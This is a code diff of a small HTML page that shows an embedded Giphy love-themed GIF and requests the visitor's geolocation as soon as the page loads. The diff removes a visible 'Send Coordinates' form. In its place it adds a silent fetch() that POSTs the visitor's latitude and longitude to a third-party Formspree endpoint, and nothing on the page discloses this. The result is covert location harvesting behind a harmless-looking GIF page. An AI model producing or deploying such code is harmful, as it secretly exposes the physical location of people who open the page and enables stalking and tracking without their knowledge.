@@ -3,16 +3,8 @@
 <body onload="getLocation()">
 
 <iframe src="https://giphy.com/embed/BUfpfjQwtrMXDKVSF6" width="320" height="480" style="" frameBorder="0" class="giphy-embed" allowFullScreen></iframe><p><a href="https://giphy.com/gifs/ZhotShop-love-amor-couple-BUfpfjQwtrMXDKVSF6">via GIPHY</a></p>
-
+  
 <p id="demo"></p>
-
-<!-- Form to submit data to Formspree -->
-<form action="https://formspree.io/f/xnnpakgj" method="POST" id="geoForm">
-  <input type="hidden" name="lat" id="lat">
-  <input type="hidden" name="long" id="long">
-  <input type="hidden" name="_subject" value="Geolocation Data">
-  <button type="submit">Send Coordinates</button>
-</form>
 
 <script>
 const x = document.getElementById("demo");
@@ -26,12 +18,22 @@ function getLocation() {
 }
 
 function showPosition(position) {
-    // Set the latitude and longitude values in the hidden form fields
-    document.getElementById('lat').value = position.coords.latitude;
-    document.getElementById('long').value = position.coords.longitude;
+    const formData = new FormData();
+    formData.append("lat", position.coords.latitude);
+    formData.append("long", position.coords.longitude);
+    formData.append("_subject", "Geolocation Data");
 
-    // Optionally, you can submit the form automatically
-    document.getElementById('geoForm').submit();
+    fetch("https://formspree.io/f/xnnpakgj", {
+        method: "POST",
+        body: formData,
+        headers: { "Accept": "application/json" }
+    }).then(response => {
+        if (response.ok) {
+            console.log("Coordinates sent successfully.");
+        } else {
+            console.log("Error sending coordinates.");
+        }
+    }).catch(error => console.error("Fetch error:", error));
 }
 </script>
 
